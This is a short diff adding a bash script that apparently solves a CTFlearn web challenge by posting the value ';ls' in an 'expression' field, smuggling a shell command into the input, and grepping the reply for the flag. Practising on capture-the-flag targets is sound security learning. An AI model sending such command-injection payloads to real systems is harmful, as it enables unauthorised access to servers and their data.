@@ -1,0 +1,2 @@
+#!/bin/bash
+curl https://web.ctflearn.com/web7/ --data-urlencode "expression=;ls" | grep ctf
